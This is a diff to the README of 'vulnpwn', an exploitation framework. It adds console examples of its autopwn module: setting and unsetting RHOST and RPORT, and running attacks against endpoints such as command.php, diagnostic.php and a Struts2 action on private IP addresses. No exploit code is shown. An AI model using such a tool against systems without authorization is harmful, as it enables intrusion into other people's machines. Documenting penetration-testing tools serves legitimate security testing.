@@ -60,12 +60,38 @@ vulnpwn (exploits/autopwn) > info
 [*] References:
 [*]   https://github.com/open-security/vulnpwn
 [*]
+vulnpwn (exploits/autopwn) > show options
+[*]
+[*]     Name   Current Setting  Description
+[*]     -----  ---------------  ---------------
+[*]     RHOST  192.168.1.1      the target host
+[*]     RPORT  80               the target port
+[*]
+vulnpwn (exploits/autopwn) > run
+[*] Exploiting - http://192.168.1.1:80/command.php
+[*] Exploiting - http://192.168.1.1:80/diagnostic.php
+[*] Exploiting - http://192.168.1.1:80/struts2-blank/example/HelloWorld.action
+```
+
+When **RPORT** is unset in ***exploits/autopwn***, every module has a default **RPORT** setting.
+
+```
+vulnpwn (exploits/autopwn) > unset RPORT
+vulnpwn (exploits/autopwn) > run
+[*] Exploiting - http://192.168.1.1:80/command.php
+[*] Exploiting - http://192.168.1.1:80/diagnostic.php
+[*] Exploiting - http://192.168.1.1:8080/struts2-blank/example/HelloWorld.action
+```
+
+If both of **RHOST** and **RPORT** are unset, autopwn will use options settings from exploits modules. ex:
+
+```
+vulnpwn (exploits/autopwn) > unset RHOST
+vulnpwn (exploits/autopwn) > unset RPORT
 vulnpwn (exploits/autopwn) > run
 [*] Exploiting - http://192.168.1.1:80/command.php
 [*] Exploiting - http://192.168.1.1:80/diagnostic.php
 [*] Exploiting - http://172.16.176.226:8080/struts2-blank/example/HelloWorld.action
-^C[*]
-[*] exit.
 ```
 
 ## Features
